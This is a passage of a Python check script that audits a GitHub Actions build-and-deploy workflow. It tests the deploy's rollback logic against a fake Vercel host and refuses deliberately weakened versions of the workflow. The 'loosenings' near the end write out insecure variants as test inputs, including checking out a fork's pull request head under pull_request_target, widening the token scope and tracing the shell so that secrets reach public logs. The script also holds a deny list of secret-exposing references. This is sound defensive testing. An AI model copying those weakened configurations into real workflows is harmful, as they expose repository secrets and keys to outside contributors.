# THE BUILD BOARD'S BUILD (decision 0007 §6, #113). It is not a reviewer, but it
# stands behind the same door and wears the same App: it mints a token for
# each product on the README's map to read that product's roadmap.json, so it
# is held as review-product.yml is — its triggers, the door, a token scoped to
# one product with contents read and nothing else, its grant and reach
# checked, the list of products held to the map both ways — and, because it
# runs on pull_request_target in a public repository, nothing of a pull request
# is checked out and a fork's wakes nothing and is not read.
BOARD_WORKFLOW = ".github/workflows/build-board.yml"
BOARD_TRIGGERS = ["check_run", "pull_request_target", "workflow_dispatch"]
BOARD_SCOPE = """body=$(jq -cn --arg r "${REPO#*/}" '{repositories: [$r], permissions: {contents: "read"}}')"""
BOARD_HOLDS = (
    (BOARD_SCOPE, "a token scoped to one product with contents read alone"),
    ("""want='{"contents":"read"}'""", "the grant checked against contents read alone"),
    ('if [ "$granted" != "$want" ]; then', "a grant that is more, or less, refused"),
    ('"https://api.github.com/installation/repositories"', "the token's reach asked of GitHub"),
    ('if [ "$reach" != "$REPO" ]; then', "a token reaching past the one product refused"),
    ("github.event.pull_request.head.repo.full_name == github.repository", "a fork's pull request waking nothing"),
    ("'[.[] | select(.head.repo.full_name == $r)", "a fork's pull request left off the board"),
    ("select(.merged_at != null and .head.repo.full_name == $r)", "a fork's merge left off the board"),
    ("github.event.check_run.app.id == %d" % REVIEWER_APP_ID, "only the reviewer's own check run waking it"),
    ("github.event.check_run.name == '%s'" % REVIEWER_CHECK, "only the reviewer's check run by name"),
    ("cancel-in-progress: false", "no deploy cut off between going live and its smoke test"),
    # What the fake host below cannot tell apart, because it answers both alike.
    ("for p in / /index.html; do", "a stranger asked at the root and at the page's own name"),
    # #117's second read, 5 and 7.
    ("persist-credentials: false", "no token left in the checkout"),
    ("check_name=%s&app_id=%d&" % (REVIEWER_CHECK, REVIEWER_APP_ID), "the reviewer's own check runs read, by its name and App"),
    # And each run kept only if it is the reviewer's, as check_run_verdict keeps
    # it, not on the query's word (#113's fourth read).
    ('select(.app.id == %d and .name == "%s" and .head_sha == $sha)' % (REVIEWER_APP_ID, REVIEWER_CHECK),
     "each check run on the board held to the reviewer's App, name and head"),
    ("        default: preview\n", "a dispatch that is a preview unless production is chosen"),
    ("      NEXT: juku-build-board-next.vercel.app\n", "the one fixed name every preview lands at"),
    ('-H "Authorization: Bearer $OPENROUTER_KEY" "https://openrouter.ai/api/v1/activity")',
     "the spend card's key used for its one read, OpenRouter's daily activity"),
    # #117's fourth read, 4c: the fake sets TARGET itself, so the line that
    # sets it is held here.
    ("TARGET: ${{ github.event_name != 'workflow_dispatch' && 'production' || inputs.target }}",
     "a dispatch's own target, never production by default"),
    # #117's second read, 6: the render takes the time the clock stamped.
    ('jq -n --arg at "$AT"', "the snapshot's time taken from before the first read"),
)
# The snapshot's stamp, before the first product is read (#117's second read, 6).
BOARD_STAMP = 'echo "checked_at='
# Read, and nothing else, for the whole workflow; one group, on the job (#117's second read, 5).
BOARD_PERMISSIONS = re.compile(r"^permissions:\n((?:  .*\n)+)", re.M)
BOARD_JOB_CONCURRENCY = "    concurrency:\n      group: build-board\n      cancel-in-progress: false\n"
# The read in order: minted, its grant and reach checked, and only then a roadmap read.
BOARD_ORDER = (BOARD_SCOPE, 'if [ "$granted" != "$want" ]; then', 'if [ "$reach" != "$REPO" ]; then',
               "contents/roadmap.json")
# The smoke's two markers, held on both sides: the PIN screen's words in the gate,
# and the attribute only the board's page carries.
BOARD_MARKS = (("board/middleware.js", "Directors only"), ("board/build.py", "<body data-board>"))
BOARD_NEVER = (
    ("upload-artifact", "an artifact, which a public repository publishes"),
    # #117's fourth read, 4b.
    ("GITHUB_STEP_SUMMARY", "a run's summary, which a public repository publishes"),
    # The spend card's key is a management key (his, 1 October 2026): one read, never a key made.
    ("openrouter.ai/api/v1/keys", "OpenRouter's keys, which the management key could make or change"),
    ("github.event.pull_request.head.sha", "the pull request's own code"),
    ("github.event.pull_request.head.ref", "the pull request's own branch"),
    ("github.head_ref", "the pull request's own branch"),
    ("merge_commit_sha", "the pull request merged into main"),
    ("refs/pull/", "a pull request's ref"),
    ("git fetch", "anything fetched beside main's own checkout"),
)
BOARD_CHECKOUT_REF = re.compile(r"^\s*ref:", re.M)
BOARD_PRODUCT = re.compile(r"^\s*(Adonis80/[A-Za-z0-9._-]+)=\S", re.M)
MAP_PRODUCT = re.compile(r"`https://github\.com/(Adonis80/[A-Za-z0-9._-]+)`")


# THE DEPLOY, RUN AGAINST A FAKE HOST (#117's second read, 4). Reading the
# rollback for its spelling held it no better than reading the wake did: two
# reads in a row found a path it did not cover. So the step's own shell is
# lifted out of the file and run, path by path, against a `curl` that answers
# as the host and the domain would from a state file, with `sleep` and `date`
# on a clock of its own, so a wait costs no time here and a deadline is still
# a deadline. The job's timeout is enforced by the fake too: a step that would
# have been cut off by it, a request with no time limit, or a call the fake does
# not know comes out as a fault, never as a pass. What the host really answers
# is unproved until the first run (the shapes here are library/deploy.md's).
BOARD_DEPLOY = "Deploy, smoke, and roll back on red"
BOARD_FAKE_CURL = r"""#!/usr/bin/env bash
# Stands in for curl: the host's API and the two addresses a stranger asks.
S="$FAKE"
refuse() { printf '%s\n' "the fake host refuses: $1" >> "$S/refused"; exit 97; }
case " $* " in *" --max-time "*) ;; *) refuse "a request with no time limit: curl $*" ;; esac
now=$(( $(cat "$S/clock") + 1 ))
echo "$now" > "$S/clock"
[ "$now" -le "$JOB_END" ] || refuse "the job's timeout would have cut this off"
method=GET url="" out="" fmt="" data="" auth=no
while [ $# -gt 0 ]; do
  case "$1" in
    -X) method=$2; shift ;;
    -o) out=$2; shift ;;
    -w) fmt=$2; shift ;;
    -d) data=$2; shift ;;
    -H) case "$2" in Authorization:*) auth=yes ;; esac; shift ;;
    --max-time) shift ;;
    https://*) url=$1 ;;
  esac
  shift
done
echo "$method $url" >> "$S/calls"
reply() {
  local f
  if [ -n "$out" ]; then printf '%s' "$2" > "$out"; else printf '%s' "$2"; fi
  f=${fmt//'%{http_code}'/$1}
  [ -z "$fmt" ] || printf '%b' "${f//'%{redirect_url}'/${3:-}}"
  [ "$1" != 000 ] || exit 28
}
sso='https://vercel.com/sso-api?url=https%3A%2F%2Fjuku-build-board-x1.vercel.app%2F&nonce=n1'
pin='<html><body><p>Directors only</p></body></html>'
board='<html><body data-board><p>NOT-FOR-THE-LOG</p></body></html>'
serving=$(cat "$S/serving")
path=${url%%\?*}
case "$method $path" in
  "GET https://api.vercel.com/v13/deployments/$DOMAIN")
    [ "${FAKE_SERVING:-ok}" = ok ] || { reply 500 '{}'; exit 0; }
    # A slow copy, READY at once, takes the domain only past the smoke's deadline.
    if [ -f "$S/land" ] && [ "$now" -ge "$(cat "$S/land")" ]; then rm -f "$S/land"; serving=dpl_copy; echo dpl_copy > "$S/serving"; fi
    # A late copy builds while the domain is looked at, and takes it on the third look.
    if [ "$(cat "$S/copy")" = late ]; then
      looks=$(( $(cat "$S/looks" 2>/dev/null || echo 0) + 1 )); echo "$looks" > "$S/looks"
      if [ "$looks" -ge 3 ]; then
        echo READY > "$S/copy"
        [ "${FAKE_DOMAIN:-pin}" = never ] || { serving=dpl_copy; echo dpl_copy > "$S/serving"; }
      fi
    fi
    reply 200 "{\"id\":\"$serving\"}" ;;
  "POST https://api.vercel.com/v13/deployments")
    case "$data" in
      @*) grep -q '"target"' "${data#@}" && refuse "a deployment given a target, which the host would put on the domain by itself"
          echo "$FAKE_NEW" > "$S/new"
          reply 200 '{"id":"dpl_new","readyState":"QUEUED"}' ;;
      # The host's CLI promotes a preview so: a production copy, which takes the domain once ready.
      *'"deploymentId":"dpl_new"'*'"target":"production"'*)
          echo "promote: a production copy of dpl_new" >> "$S/calls"
          [ "$TARGET" = production ] || refuse "a production copy made on a preview run"
          [ "$(cat "$S/new")" = READY ] || refuse "a copy of a deployment that is not READY"
          [ "${FAKE_PROMOTE:-ok}" = ok ] || { reply 400 '{"error":{"code":"bad_request"}}'; exit 0; }
          if [ "${FAKE_COPY:-READY}" = slow ]; then echo READY > "$S/copy"; echo $(( STARTED + 9 * 60 + 20 )) > "$S/land"
          else echo "${FAKE_COPY:-READY}" > "$S/copy"; fi
          [ "${FAKE_COPY:-READY}" != READY ] || [ "${FAKE_DOMAIN:-pin}" = never ] || echo dpl_copy > "$S/serving"
          reply 200 '{"id":"dpl_copy","readyState":"QUEUED"}' ;;
      *) refuse "a deployment with no files" ;;
    esac ;;
  "GET https://api.vercel.com/v13/deployments/dpl_new")
    reply 200 "{\"id\":\"dpl_new\",\"readyState\":\"$(cat "$S/new")\",\"url\":\"juku-build-board-x1.vercel.app\"}" ;;
  "GET https://api.vercel.com/v13/deployments/dpl_copy")
    c=$(cat "$S/copy"); [ "$c" != late ] || c=BUILDING
    reply 200 "{\"id\":\"dpl_copy\",\"readyState\":\"$c\"}" ;;
  "PATCH https://api.vercel.com/v12/deployments/dpl_copy/cancel")
    # late: the copy went READY and took the domain as it was cancelled.
    if [ "${FAKE_CANCEL:-ok}" = late ]; then echo READY > "$S/copy"; echo dpl_copy > "$S/serving"; reply 409 '{}'; exit 0; fi
    [ "${FAKE_CANCEL:-ok}" = ok ] || { reply 400 '{}'; exit 0; }
    echo CANCELED > "$S/copy"; reply 200 '{"readyState":"CANCELED"}' ;;
  "GET https://api.vercel.com/v13/deployments/dpl_before")
    reply 200 '{"id":"dpl_before","readyState":"READY"}' ;;
  "PATCH https://api.vercel.com/v12/deployments/dpl_new/cancel")
    [ "${FAKE_CANCEL:-ok}" = ok ] || { reply 400 '{}'; exit 0; }
    echo CANCELED > "$S/new"; reply 200 '{"readyState":"CANCELED"}' ;;
  "DELETE https://api.vercel.com/v13/deployments/dpl_new")
    echo DELETED > "$S/new"; reply 200 '{"state":"DELETED"}' ;;
  # As the host answered run 36997804844: a preview is not promoted, and
  # what the domain still serves is not promoted again.
  "POST https://api.vercel.com/v10/projects/$PROJECT/promote/dpl_new")
    reply 422 '{"error":{"code":"not_production"}}' ;;
  "POST https://api.vercel.com/v10/projects/$PROJECT/promote/dpl_before")
    [ "$serving" != dpl_before ] || { reply 409 '{}'; exit 0; }
    case "${FAKE_ROLLBACK:-ok}" in refused) reply 409 '{}'; exit 0 ;; ok) echo dpl_before > "$S/serving" ;; esac
    reply 201 '' ;;
  "POST https://api.vercel.com/v2/deployments/dpl_new/aliases")
    [ "$TARGET" = preview ] || refuse "the fixed preview name given to a production run"
    [ "$(cat "$S/new")" = READY ] || refuse "the fixed preview name given before the smoke"
    [ "${FAKE_ALIAS:-ok}" = ok ] || { reply 403 '{}'; exit 0; }
    echo yes > "$S/aliased"; reply 200 '{}' ;;
  "GET https://$NEXT/"|"GET https://$NEXT/index.html")
    [ "$auth" = no ] || refuse "a stranger's request carrying a key"
    [ -f "$S/aliased" ] || refuse "the fixed preview name asked before it was given"
    [ "$(cat "$S/new")" = READY ] || { reply 404 'gone'; exit 0; }
    case "${FAKE_NEXT:-wall}" in board) reply 200 "$board" ;; *) reply 302 '' "$sso" ;; esac ;;
  "GET https://$DOMAIN/"|"GET https://$DOMAIN/index.html")
    [ "$auth" = no ] || refuse "a stranger's request carrying a key"
    [ "$serving" = dpl_copy ] || { reply 200 "$pin"; exit 0; }
    case "${FAKE_DOMAIN:-pin}" in
      board) reply 200 "$board" ;;
      blank) reply 502 'bad gateway' ;;
      wall) reply 302 '' "$sso" ;;
      *) reply 200 "$pin" ;;
    esac ;;
  "GET https://juku-build-board-x1.vercel.app/"|"GET https://juku-build-board-x1.vercel.app/index.html")
    [ "$auth" = no ] || refuse "a stranger's request carrying a key"
    [ "$(cat "$S/new")" = READY ] || { reply 404 'gone'; exit 0; }
    # The host's sign-in wall, as run 36715901351 found it: a redirect.
    case "${FAKE_PREVIEW:-wall}" in
      wall) reply 302 '' "$sso" ;;
      elsewhere) reply 302 '' 'https://vercel.com.example/sso-api?url=x' ;;
      denied) reply 401 '<html>Authentication Required</html>' ;;
      pin) reply 200 "$pin" ;;
      board) reply 200 "$board" ;;
      none) reply 000 '' ;;
    esac ;;
  *) refuse "$method $url" ;;
esac
"""
BOARD_FAKE_SLEEP = """#!/usr/bin/env bash
echo $(( $(cat "$FAKE/clock") + ${1%s} )) > "$FAKE/clock"
[ "$(cat "$FAKE/clock")" -le "$JOB_END" ] || { echo "the fake host refuses: the job's timeout would have cut this off" >> "$FAKE/refused"; exit 97; }
"""
BOARD_FAKE_DATE = """#!/usr/bin/env bash
if [ "$*" = "+%s" ]; then cat "$FAKE/clock"; else exec /bin/date "$@"; fi
"""
# (what, environment, exit, what the domain serves after, the new deployment's
# end state, what the log must say, what it must not). The two that pass carry
# as much weight as the rest: without them a step that always exits 1 would
# satisfy every other line. The paths #117's second read named come first.
BOARD_DEPLOY_CASES = (
    ("a production deploy that passes", {}, 0, "dpl_copy", "READY", "live: dpl_copy, the copy of dpl_new", None),
    ("the domain shows a stranger the board", {"FAKE_DOMAIN": "board"}, 1, "dpl_before", "READY",
     "rolled back: roadmap.juku.pro serves dpl_before", None),
    ("the domain never serves it", {"FAKE_DOMAIN": "never"}, 1, "dpl_before", "READY",
     "rolled back: roadmap.juku.pro serves dpl_before", None),
    ("it is never READY: the wait gives up and cancels it", {"FAKE_READY": "BUILDING"}, 1, "dpl_before",
     "CANCELED", "cancelled: dpl_new", "promote"),
    ("the promote is refused", {"FAKE_PROMOTE": "no"}, 1, "dpl_before", "READY", "PROMOTE REFUSED", None),
    # Run 36997804844: a copy that never comes ready is cancelled before it can
    # take the domain, and a domain still on what it served is put back as is.
    ("the copy never comes ready", {"FAKE_COPY": "BUILDING"}, 1, "dpl_before", "READY",
     "cancelled: dpl_copy", "ROLLBACK REFUSED"),
    ("the copy never comes ready, and its cancel is refused", {"FAKE_COPY": "BUILDING", "FAKE_CANCEL": "no"}, 1,
     "dpl_before", "READY", "CANCEL REFUSED", "rolled back"),
    # #139's read, 2a and 3: the copy READY on a later look, failed, or READY
    # as it is cancelled, which is put back like any other.
    ("a copy that comes ready on the third look", {"FAKE_COPY": "late"}, 0, "dpl_copy", "READY",
     "live: dpl_copy, the copy of dpl_new", None),
    # #139's second read, 3: READY, but given the domain only after the smoke
    # gave up; the put-back waits for it rather than land first and be undone.
    ("a READY copy the host gives the domain late", {"FAKE_COPY": "slow"}, 1, "dpl_before", "READY",
     "rolled back: roadmap.juku.pro serves dpl_before", None),
    ("the copy fails to build", {"FAKE_COPY": "ERROR"}, 1, "dpl_before", "READY",
     "rolled back: roadmap.juku.pro serves dpl_before", "cancelled: dpl_copy"),
    ("the copy goes READY as it is cancelled", {"FAKE_COPY": "BUILDING", "FAKE_CANCEL": "late"}, 1, "dpl_before",
     "READY", "rolled back: roadmap.juku.pro serves dpl_before", "CANCEL"),
    ("the rollback is accepted and never lands", {"FAKE_DOMAIN": "board", "FAKE_ROLLBACK": "stuck"}, 1,
     "dpl_copy", "READY", "ROLLBACK UNCONFIRMED", None),
    # A rollback begun at the deadline still has its three minutes in the job.
    ("the domain never shows the PIN screen, and the rollback never lands",
     {"FAKE_DOMAIN": "blank", "FAKE_ROLLBACK": "stuck"}, 1, "dpl_copy", "READY", "ROLLBACK UNCONFIRMED", None),
    ("the rollback is refused", {"FAKE_DOMAIN": "board", "FAKE_ROLLBACK": "refused"}, 1, "dpl_copy",
     "READY", "ROLLBACK REFUSED", None),
    ("a preview for his look", {"TARGET": "preview", "LIVE": "no"}, 0, "dpl_before", "READY",
     "preview ready at the fixed address: https://juku-build-board-next.vercel.app", "promote"),
    ("the fixed address shows a stranger the board", {"TARGET": "preview", "LIVE": "no", "FAKE_NEXT": "board"}, 1,
     "dpl_before", "DELETED", "A STRANGER WAS SERVED THE BOARD at the fixed address", "promote"),
    ("a preview that is never ready takes no fixed name", {"TARGET": "preview", "LIVE": "no", "FAKE_READY": "BUILDING"}, 1,
     "dpl_before", "CANCELED", "cancelled: dpl_new", "fixed address"),
    ("a preview whose fixed name is refused", {"TARGET": "preview", "LIVE": "no", "FAKE_ALIAS": "no"}, 0,
     "dpl_before", "READY", "the fixed preview address was refused", "promote"),
    ("an automatic run before his look", {"GITHUB_EVENT_NAME": "pull_request_target", "LIVE": "no"}, 0,
     "dpl_before", "none", "rendered, not deployed", "deployment:"),
    # #117's fourth read, 2: a production dispatch waits for his look too.
    ("a production dispatch before his look", {"LIVE": "no"}, 1, "dpl_before", "none",
     "production waits for his look", "deployment:"),
    # Run 36714764680: only the host's own sign-in redirect is its wall, and
    # only at a preview.
    ("the preview redirects a stranger somewhere else", {"FAKE_PREVIEW": "elsewhere"}, 1, "dpl_before",
     "DELETED", "neither the sign-in wall nor the PIN screen", "promote"),
    ("the preview refuses a stranger without the host's sign-in", {"FAKE_PREVIEW": "denied"}, 1,
     "dpl_before", "DELETED", "neither the sign-in wall nor the PIN screen", "promote"),
    ("the domain shows a stranger the host's sign-in, not the PIN screen", {"FAKE_DOMAIN": "wall"}, 1,
     "dpl_before", "READY", "rolled back: roadmap.juku.pro serves dpl_before", None),
    ("the preview shows a stranger the board", {"FAKE_PREVIEW": "board"}, 1, "dpl_before", "DELETED",
     "A STRANGER WAS SERVED THE BOARD at the preview", "promote"),
    ("the preview shows a stranger the board, asked for as a preview",
     {"TARGET": "preview", "FAKE_PREVIEW": "board"}, 1, "dpl_before", "DELETED",
     "deleted: dpl_new", "juku-build-board-x1.vercel.app"),
    ("the preview never answers", {"FAKE_PREVIEW": "none"}, 1, "dpl_before", "DELETED",
     "neither the sign-in wall nor the PIN screen", "promote"),
    ("it is never READY, and the cancel is refused", {"FAKE_READY": "BUILDING", "FAKE_CANCEL": "no"}, 1,
     "dpl_before", "BUILDING", "CANCEL REFUSED", "promote"),
    ("its build fails", {"FAKE_READY": "ERROR"}, 1, "dpl_before", "ERROR", "ended ERROR", "promote"),
    ("what the domain serves cannot be recorded", {"FAKE_SERVING": "no"}, 1, "dpl_before", "none",
     "could not be recorded", "deployment:"),
    ("too little of the job is left", {"LATE": "yes"}, 1, "dpl_before", "none", "too little of the job",
     "deployment:"),
)
_board_runs = {}


def board_deploy_faults(text):
    """Run the deploy step against the fake host, every path at once. Its faults, or [].

    The paths run side by side, each in its own directory on its own clock,
    and a step already run is not run again: most loosenings leave it alone.
    """
    span = _step_span(text, BOARD_DEPLOY)
    script = wake_script(text[span[0]:span[1]]) if span else None
    if script is None:
        return ["has no deploy step named %r whose shell can be run whole" % BOARD_DEPLOY]
    m = TIMEOUT.search(text)
    if not m:
        return ["sets no timeout-minutes, so nothing bounds the deploy's rollback"]
    job = int(m.group(1)) * 60
    key = (script, job)
    if key not in _board_runs:
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            runs = pool.map(lambda case: _board_deploy_case(script, job, case), BOARD_DEPLOY_CASES)
            _board_runs[key] = [f for faults in runs for f in faults]
    return _board_runs[key]


def _board_deploy_case(script, job, case):
    what, env, want_rc, want_serving, want_new, says, never = case
    start = 1000000
    # A minute spent reading before the deploy began; in the late case, all
    # but five of the job's minutes.
    clock = start + (job - 300 if env.get("LATE") else 60)
    with tempfile.TemporaryDirectory() as d:
        binned, fake, run = (os.path.join(d, n) for n in ("bin", "fake", "run"))
        for n in (binned, fake, os.path.join(run, "site")):
            os.makedirs(n)
        for name, body in (("curl", BOARD_FAKE_CURL), ("sleep", BOARD_FAKE_SLEEP), ("date", BOARD_FAKE_DATE)):
            with open(os.path.join(binned, name), "w", encoding="utf-8") as f:
                f.write(body)
            os.chmod(os.path.join(binned, name), 0o755)
        for name, body in (("clock", clock), ("serving", "dpl_before"), ("new", "none"), ("copy", "none"), ("calls", ""),
                           ("refused", "")):
            with open(os.path.join(fake, name), "w", encoding="utf-8") as f:
                f.write("%s\n" % body if body != "" else "")
        for name in ("index.html", "middleware.js", "robots.txt", "vercel.json"):
            with open(os.path.join(run, "site", name), "w", encoding="utf-8") as f:
                f.write("x")
        e = {k: v for k, v in os.environ.items() if not k.startswith("FAKE_")}
        e.update({"PATH": binned + os.pathsep + os.environ.get("PATH", ""), "FAKE": fake,
                  # The job's clock started before this one, at the checkout.
                  "JOB_END": str(start + job - 30), "RUNNER_TEMP": run, "STARTED": str(start),
                  "GITHUB_EVENT_NAME": "workflow_dispatch", "LIVE": "yes", "TARGET": "production",
                  "VERCEL_TOKEN": "not-a-token", "TEAM": "team_x", "PROJECT": "prj_x",
                  "DOMAIN": "roadmap.juku.pro", "NEXT": "juku-build-board-next.vercel.app", "FAKE_NEW": env.get("FAKE_READY", "READY")})
        e.update({k: v for k, v in env.items() if k != "LATE"})
        try:
            p = subprocess.run(["bash", "-c", script], env=e, capture_output=True, text=True, timeout=60)
        except (OSError, subprocess.SubprocessError) as exc:
            return ["on '%s' could not be run (%s)" % (what, exc)]

        def state(name):
            with open(os.path.join(fake, name), encoding="utf-8") as f:
                return f.read().strip()
        log = p.stdout + p.stderr
        # A slow copy still to land when the step ends takes the domain after it.
        if os.path.exists(os.path.join(fake, "land")):
            with open(os.path.join(fake, "serving"), "w", encoding="utf-8") as f:
                f.write("dpl_copy\n")
        faults = []
        if state("refused"):
            faults.append("on '%s' made a call the host would refuse or the job would not have lived to "
                          "make: %s" % (what, state("refused").splitlines()[0]))
        if p.returncode != want_rc:
            faults.append("on '%s' exited %d, not %d" % (what, p.returncode, want_rc))
        if state("serving") != want_serving:
            faults.append("on '%s' left the domain serving %s, not %s" % (what, state("serving"), want_serving))
        if state("new") != want_new:
            faults.append("on '%s' left its deployment %s, not %s" % (what, state("new"), want_new))
        if says not in log:
            faults.append("on '%s' never says %r" % (what, says))
        if never and never in (log if never != "promote" else state("calls")):
            faults.append("on '%s' %s %r" % (what, "called" if never == "promote" else "says", never))
        if "NOT-FOR-THE-LOG" in log:
            faults.append("on '%s' printed the board into the log" % what)
        if int(state("clock")) > start + job - 30:
            faults.append("on '%s' ran past the job's timeout" % what)
        return faults


def _check_board_wiring(board=None, product=None, readme=None, quiet=False):
    """build-board.yml, held to the door, one product per token, and the README's map."""
    say = (lambda *a: None) if quiet else print
    try:
        board = _read(BOARD_WORKFLOW) if board is None else board
        product = _read(PRODUCT_WORKFLOW) if product is None else product
        readme = _read("README.md") if readme is None else readme
    except OSError as e:
        say("  wiring: %s" % e)
        return 1
    bad = 0

    def fault(what):
        nonlocal bad
        say("  wiring: %s %s" % (BOARD_WORKFLOW, what))
        bad += 1

    # No `pull_request`, whose run is a branch's own file, and no clock.
    if triggers(board) != BOARD_TRIGGERS:
        fault("triggers on %s; it must be %s and nothing else — never a branch's own copy, never "
              "a clock" % (triggers(board), BOARD_TRIGGERS))
    if not USES_ENVIRONMENT.search(board):
        fault("does not run in the `%s` environment, so the App's key and the deploy key are "
              "readable from any branch" % KEY_ENVIRONMENT)
    for line, what in BOARD_HOLDS:
        if line not in board:
            fault("has lost %s (`%s`)" % (what, line))
    for word, what in BOARD_NEVER:
        if word in board:
            fault("reaches %s (`%s`)" % (what, word))
    if BOARD_CHECKOUT_REF.search(board) or board.count("uses: actions/checkout") != 1:
        fault("checks out something other than main's own tree, once")
    at = [board.find(line) for line in BOARD_ORDER]
    if -1 in at or at != sorted(at):
        fault("reads a roadmap before its token's grant and reach are checked (%s)" % " < ".join(BOARD_ORDER))
    for path, mark in BOARD_MARKS:
        try:
            if mark not in _read(path):
                fault("smokes for %r, which %s no longer carries" % (mark, path))
        except OSError as e:
            fault("smokes against %s, which cannot be read: %s" % (path, e))
    if XTRACE.search(board):
        fault("traces its shell, which prints what it holds into a public log")
    # The spend card's management key: one read in this file, and in no other (#134's first read, 3).
    if board.count("openrouter.ai") != 1:
        fault("asks OpenRouter %d times; the spend card's key makes one read, its daily activity"
              % board.count("openrouter.ai"))
    if board.count("Bearer $OPENROUTER_KEY") != 1:
        fault("sends the spend card's key %d times; it goes once, to OpenRouter's daily activity (#134's second read, 1)"
              % board.count("Bearer $OPENROUTER_KEY"))
    for other in sorted(glob.glob(".github/workflows/*.yml")):
        if other != BOARD_WORKFLOW and "secrets.OPENROUTER_KEY" in _read(other):
            fault("shares the spend card's management key with %s" % other)
    perms = BOARD_PERMISSIONS.search(board)
    if (not perms or len(re.findall(r"^\s*permissions:", board, re.M)) != 1
            or not all(re.match(r"^  [a-z-]+: read$", l) for l in perms.group(1).splitlines())):
        fault("asks for more than read: one `permissions:` block, for the workflow, every line of it read")
    if re.search(r"^concurrency:", board, re.M) or BOARD_JOB_CONCURRENCY not in board:
        fault("keeps its concurrency group on the workflow, or not at all; it belongs on the job, so a "
              "skipped run never joins it")
    unbounded = [l.strip() for l in board.splitlines() if re.search(r"\bcurl\s", l)
                 and not l.strip().startswith("#") and "--max-time" not in l]
    if unbounded:
        fault("makes a request with no time limit (`%s`)" % unbounded[0])
    stamp, read = board.find(BOARD_STAMP), board.find("contents/roadmap.json")
    if stamp == -1 or read == -1 or stamp > read:
        fault("stamps the snapshot's time after the first product is read, or not at all")
    for f in board_deploy_faults(board):
        fault("deploy step %s" % f)
    if _jwt(board) is None or _jwt(board) != _jwt(product):
        fault("signs the App's JWT differently from %s" % PRODUCT_WORKFLOW)
    listed = sorted(set(BOARD_PRODUCT.findall(board)))
    mapped = sorted(set(MAP_PRODUCT.findall(readme)))
    if not listed or listed != mapped:
        fault("reads %s, and the README's map names %s: the board reads the map's products, all "
              "of them and nothing else" % (listed, mapped))
    # The page's rows are the same list, by name: two copies of one truth held equal.
    named = sorted(set(re.findall(r"^\s*Adonis80/[A-Za-z0-9._-]+=(.+?)\s*$", board, re.M)))
    try:
        spec = importlib.util.spec_from_file_location("board_build", "board/build.py")
        build = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(build)
        rows = sorted(r for r in build.ROWS if r != build.RULEBOOK)
    except (OSError, ImportError, SyntaxError, AttributeError) as e:
        rows = ["unreadable: %s" % e]
    if rows != named:
        fault("names its products %s, and board/build.py draws rows for %s" % (named, rows))
    if not bad:
        say("ok: the board's build runs only from main, behind the `%s` door, on a dispatch, this "
            "repository's own pull requests and the reviewer's check run; it reads the %d products "
            "on the README's map with a token each, contents read alone, its grant and reach "
            "checked before anything is read; it checks out nothing of a pull request, uploads "
            "nothing, and its deploy, run against a fake host on %d paths, gives production only a "
            "copy of a preview it has smoked, cancels or deletes one that fails, and on a red after "
            "the copy cancels one still building and puts back what the domain served, inside the job's time"
            % (KEY_ENVIRONMENT, len(listed), len(BOARD_DEPLOY_CASES)))
    return bad


# Each loosening of build-board.yml that the check above must refuse.
BOARD_LOOSENINGS = (
    ("a pull_request trigger", lambda t: t.replace("  pull_request_target:\n", "  pull_request:\n    types: [opened]\n  pull_request_target:\n", 1)),
    ("a clock", lambda t: t.replace("  check_run:\n", "  schedule:\n    - cron: '0 * * * *'\n  check_run:\n", 1)),
    ("the door removed", lambda t: t.replace("    environment: reviewer\n", "", 1)),
    ("a wider token", lambda t: t.replace(BOARD_SCOPE, BOARD_SCOPE.replace('{contents: "read"}', '{contents: "read", pull_requests: "write"}'), 1)),
    ("the grant unchecked", lambda t: t.replace('if [ "$granted" != "$want" ]; then', "if false; then", 1)),
    ("the reach unchecked", lambda t: t.replace('if [ "$reach" != "$REPO" ]; then', "if false; then", 1)),
    ("a product not on the map", lambda t: t.replace("          PRODUCTS\n", "          Adonis80/elsewhere=Elsewhere\n          PRODUCTS\n", 1)),
    ("a product on the map left out", lambda t: t.replace("          Adonis80/phena=Phena\n", "", 1)),
    ("a fork's pull request waking it", lambda t: t.replace("github.event.pull_request.head.repo.full_name == github.repository", "true", 1)),
    ("a fork's pull request read", lambda t: t.replace("'[.[] | select(.head.repo.full_name == $r)", "'[.[] | select(true)", 1)),
    ("any check run waking it", lambda t: t.replace("github.event.check_run.app.id == 5000405 &&", "", 1)),
    ("an artifact uploaded", lambda t: t.replace("      - name: Render\n", "      - uses: actions/upload-artifact@v4\n        with:\n          path: ${{ runner.temp }}\n      - name: Render\n", 1)),
    ("a traced shell", lambda t: t.replace("set -euo pipefail", "set -euxo pipefail", 1)),
    ("the pull request's head checked out", lambda t: t.replace("          persist-credentials: false\n", "          persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}\n", 1)),
    ("a deploy cut off mid-way", lambda t: t.replace("cancel-in-progress: false", "cancel-in-progress: true", 1)),
    ("a rollback to the new deployment", lambda t: t.replace("promote/$before", "promote/$id", 1)),
    ("nothing put back on a red", lambda t: t.replace("          trap cleanup EXIT\n", "", 1)),
    ("a refused rollback taken as done", lambda t: t.replace('[[ "$code" =~ ^2 ]] || { [ "$code" = 409 ] && serves "$before"; } || {', 'true || {', 1)),
    ("a building copy left to take the domain", lambda t: t.replace("                    READY|ERROR|CANCELED) ;;\n", "                    *) ;;\n", 1)),
    ("a READY copy's landing not waited for", lambda t: t.replace('for _ in 1 2 3 4 5 6; do serves "$copy" && break; sleep 10; done', "true", 1)),
    ("a copy READY at its cancel left on the domain", lambda t: t.replace("                         READY) ;;\n", "                         READY) exit 1 ;;\n", 1)),
    ("a rollback never confirmed", lambda t: t.replace('serves "$before" && {', "true && {", 1)),
    ("a leaked board asked again", lambda t: t.replace('if grep -q "data-board" <<< "$body"; then return 2; fi', "if false; then return 2; fi", 1)),
    ("the page's own name never smoked", lambda t: t.replace("for p in / /index.html; do", "for p in /; do", 1)),
    # #117's second read, 1: the host never moves the domain, and what it
    # served is what is put back.
    ("the domain left to the host", lambda t: t.replace("projectSettings: {framework: null},", 'projectSettings: {framework: null}, target: "production",', 1)),
    ("what is live read from the project", lambda t: t.replace("before=$(serving)", """before=$(v "https://api.vercel.com/v9/projects/$PROJECT?$q" | jq -r '.targets.production.id // empty')""", 1)),
    ("a smoke passed on any deployment", lambda t: t.replace('if [ "$g" -eq 0 ] && serves "$copy"; then', 'if [ "$g" -eq 0 ]; then', 1)),
